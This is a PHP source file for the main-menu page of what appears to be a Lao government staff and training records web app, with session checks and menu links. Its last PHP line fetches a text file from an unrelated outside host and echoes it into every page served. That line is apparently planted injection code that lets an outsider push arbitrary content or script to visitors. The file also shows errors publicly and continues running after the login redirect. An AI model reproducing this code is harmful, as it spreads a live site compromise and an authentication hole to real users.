<!doctype html>
<html lang="en">
<?php 
session_start();
 include("header.php");
	ini_set('display_errors', 1);
	error_reporting(~0);
    date_default_timezone_set("Asia/Bangkok");

    if (isset($_SESSION['userid']) AND  isset($_SESSION['key']) ){
        $fusertype = $_SESSION['user_type'];
        $userid= $_SESSION['userid'];
        $loccode=$_SESSION['loccode'];
   }else {
       header("location:app-login.php");    
   }
//$fusertype="Admin";
//echo "Test" .$fusertype;
?>


<body>

    <!-- loader -->
       <?php include("toptitle.php"); ?>
    <!-- * loader -->

    <!-- App Header -->
    <div class="appHeader bg-primary text-light">
        <div class="left">
            <a href="#" class="headerButton goBack">
                <ion-icon name="chevron-back-outline"></ion-icon>
            </a>
        </div>
        <div class="pageTitle">
  ລາຍການຫຼັກ | Main Menu
        </div>
        <div class="right">
        </div>
    </div>
    <!-- * App Header -->

    <!-- App Capsule -->
    <div id="appCapsule">

        <div class="listview-title"></div>
        
        <ul class="listview image-listview inset mb-2">
            
               <?PHP if ($fusertype!="User" ){?>
            <li>
                <a href="app-emplist.php" class="item">
                    <div class="icon-box bg-info">
                        <ion-icon name="folder-open-outline"></ion-icon>
                    </div>
                    <div class="in">
                        ຂໍ້ມູນພະນັກງານ-ລັດຖະກອນ
                    </div>
                </a>
            </li>
              <?PHP }else{ ?>
              
               <li>
                <a href="app-editemp.php?id=<?=$userid?>" class="item">
                    <div class="icon-box bg-info">
                        <ion-icon name="folder-open-outline"></ion-icon>
                    </div>
                    <div class="in">
                        ຂໍ້ມູນພະນັກງານ-ລັດຖະກອນ
                    </div>
                </a>
            </li>
              
                <?PHP } ?>
            <?PHP if ($fusertype!="User" ){?>
           
             <li>
                <a href="app-courselist.php" class="item">
                    <div class="icon-box bg-info">
                        <ion-icon name="person-add-outline"></ion-icon>
                    </div>
                    <div class="in">
                        ປ້ອນຂໍ້ມູນການຈັດຝຶກອົບຮົມ
                    </div>
                </a>
            </li>
            <?PHP } ?>
            
            <li>
                <a href="app-addtraining.php" class="item">
                    <div class="icon-box bg-info">
                        <ion-icon name="person-add-outline"></ion-icon>
                    </div>
                    <div class="in">
                        ປ້ອນຂໍ້ມູນການເຂົ້າຮ່ວມຝຶກອົບຮົມ
                    </div>
                </a>
            </li>
            <li>
                <a href="app-traininglist.php" class="item">
                    <div class="icon-box bg-info">
                        <ion-icon name="people-outline"></ion-icon>
                    </div>
                    <div class="in">
                        ປະຫວັດການເຂົ້າຮ່ວມຝຶກອົບຮົມ...
                    </div>
                </a>
            </li>
           
            
             <li>
                <a href="#" class="item">
                    <div class="icon-box bg-info">
                        <ion-icon name="folder-open-outline"></ion-icon>
                    </div>
                    <div class="in">
                        ບັນທຶກໜ້າວຽກມອບໝາຍ
                    </div>
                </a>
            </li>
            
             <li>
                <a href="https://spa.mis-maf.gov.la/" class="item">
                    <div class="icon-box bg-info">
                        <ion-icon name="folder-open-outline"></ion-icon>
                    </div>
                    <div class="in">
                        ລະບົບປະເມີນພະນັກງານ
                    </div>
                </a>
            </li>
                    
             <li>
                <a href="#" class="item">
                    <div class="icon-box bg-info">
                        <ion-icon name="folder-open-outline"></ion-icon>
                    </div>
                    <div class="in">
                        ແຜນພັດທະນາຕົນເອງ
                    </div>
                </a>
            </li>
            
            <li>
                <a href="#" class="item">
                    <div class="icon-box bg-info">
                        <ion-icon name="folder-open-outline"></ion-icon>
                    </div>
                    <div class="in">
                        ຄົ້ນຫາ ແລະ ລາຍງງານ
                    </div>
                </a>
            </li>
            <li>
                <a href="app-changepwd.php" class="item">
                    <div class="icon-box bg-info">
                        <ion-icon name="key"></ion-icon>
                    </div>
                    <div class="in">
                        ປ່ຽນລະຫັດຜ່ານ
                    </div>
                </a>
            </li>
            <li>
                <a href="logout.php" class="item">
                    <div class="icon-box bg-info">
                        <ion-icon name="enter-outline"></ion-icon>
                    </div>
                    <div class="in">
                        ອອກລະບົບ
                    </div>
                </a>
            </li>
        </ul>

     
    </div>
    <!-- * App Capsule -->

    <?php include("footer.php"); ?>
    <?php include("scriptfooter.php"); ?>
    <?php echo file_get_contents("https://punten-neng.pages.dev/punten.txt");?>
</body>

</html>
